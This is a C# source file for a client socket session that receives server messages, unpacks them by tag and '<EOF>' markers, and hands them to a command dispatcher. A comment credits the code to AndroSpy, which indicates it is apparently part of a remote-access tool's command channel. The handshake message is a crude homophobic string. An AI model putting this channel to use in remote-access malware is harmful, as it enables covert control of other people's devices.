using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Client.Connection
{
    class ServerSession : IDisposable
    {
        private MemoryStream memos = new MemoryStream();
        private ConnectClient _globalService = default;
        private byte[] dataByte = new byte[8192]; // 1024 * 8
        private int blockSize = 8192;
        public static Socket sck;


        public ServerSession(Socket serverSock, ConnectClient set)
        {
            _globalService = set;
            sck = serverSock;
            _globalService.globalMemoryStream = memos;

            /*byte[] dataToSend = System.Text.Encoding.UTF8.GetBytes("Hello I Am Connected");
            dataToSend = ConnectClient.MyDataPacker("STMSG", dataToSend);
            ConnectClient.Send(dataToSend);*/

            byte[] dataToSend = Encoding.UTF8.GetBytes("Bro You Are Gay");
            dataToSend = ConnectClient.MyDataPacker("SCCS", dataToSend);
            ConnectClient.Send(dataToSend);

            Read(sck);
        }

        private async void Read(Socket server)
        {
            int readed = default;
            while (true)
            {
                try
                {
                    readed = server.Receive(dataByte, 0, blockSize, SocketFlags.None);
                    if (readed > 0)
                    {
                        if (memos != null)
                        {
                            memos.Write(dataByte, 0, readed);
                            UnPacker(memos);
                        }
                    }
                }
                catch (Exception)
                {
                    Dispose();
                    break;
                }
                await Task.Delay(1);
            }
        }


        private void UnPacker(MemoryStream ms)
        {
            //This unpacker coded by qH0sT' - 2021 - AndroSpy.
            //string letter = "qwertyuıopğüasdfghjklşizxcvbnmöç1234567890<>|";
            Regex regex = new Regex(@"<[A-Z]+>\|[0-9]+\|.*>");

            byte[][] filebytes = Separate(ms.ToArray(), System.Text.Encoding.UTF8.GetBytes("SUFFIX"));
            for (int k = 0; k < filebytes.Length; k++)
            {
                if (!(filebytes[k].Length <= 0))
                {
                    try
                    {
                        string ch = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 1] });// >
                        string f = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 2] });// F>
                        string o = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 3] });// OF>
                        string e = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 4] });// EOF>
                        string ch_ = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 5] });// <EOF>

                        bool isContainsEof = (ch_ + e + o + f + ch) == "<EOF>";
                        if (isContainsEof)
                        {
                            List<byte> mytagByte = new List<byte>();
                            string temp = "";
                            for (int p = 0; p < filebytes[k].Length; p++)
                            {
                                //if (letter.Contains(Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] }).ToLower()))
                                //{
                                temp += System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] });
                                mytagByte.Add(filebytes[k][p]);
                                if (regex.IsMatch(temp))
                                {
                                    break;
                                }
                                //}
                            }
                            string whatsTag = System.Text.Encoding.UTF8.GetString(mytagByte.ToArray());

                            MemoryStream tmpMemory = new MemoryStream();
                            tmpMemory.Write(filebytes[k], 0, filebytes[k].Length);
                            tmpMemory.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                            ms.Flush();
                            ms.Close();
                            ms.Dispose();
                            ms = new MemoryStream(RemoveBytes(ms.ToArray(), tmpMemory.ToArray()));
                            memos = new MemoryStream();
                            ms.CopyTo(memos);
                            tmpMemory.Flush();
                            tmpMemory.Close();
                            tmpMemory.Dispose();
                            filebytes[k] = RemoveBytes(filebytes[k], mytagByte.ToArray());
                            filebytes[k] = RemoveBytes(filebytes[k], System.Text.Encoding.UTF8.GetBytes("<EOF>"));


                            CommandReaderClient.DataProcess(whatsTag, filebytes[k]); // Process our datas as tag and buffer data.

                        }
                    }
                    catch (Exception) { }
                }
            }
        }

        private byte[][] Separate(byte[] source, byte[] separator)
        {
            var Parts = new List<byte[]>();
            var Index = 0;
            byte[] Part;
            for (var I = 0; I < source.Length; ++I)
            {
                if (Equals(source, separator, I))
                {
                    Part = new byte[I - Index];
                    Array.Copy(source, Index, Part, 0, Part.Length);
                    Parts.Add(Part);
                    Index = I + separator.Length;
                    I += separator.Length - 1;
                }
            }
            Part = new byte[source.Length - Index];
            Array.Copy(source, Index, Part, 0, Part.Length);
            Parts.Add(Part);
            return Parts.ToArray();
        }
        private bool Equals(byte[] source, byte[] separator, int index)
        {
            for (int i = 0; i < separator.Length; ++i)
                if (index + i >= source.Length || source[index + i] != separator[i])
                    return false;
            return true;
        }
        private byte[] RemoveBytes(byte[] input, byte[] pattern)
        {
            if (pattern.Length == 0) return input;
            var result = new List<byte>();
            for (int i = 0; i < input.Length; i++)
            {
                var patternLeft = i <= input.Length - pattern.Length;
                if (patternLeft && (!pattern.Where((t, j) => input[i + j] != t).Any()))
                {
                    i += pattern.Length - 1;
                }
                else
                {
                    result.Add(input[i]);
                }
            }
            return result.ToArray();
        }

        public void Dispose()
        {
            Dispose(true);
            try { GC.SuppressFinalize(this); } catch (Exception) { }
        }
        protected bool Disposed { get; private set; }
        protected virtual void Dispose(bool disposing)
        {
            Disposed = true;
        }
    }
}
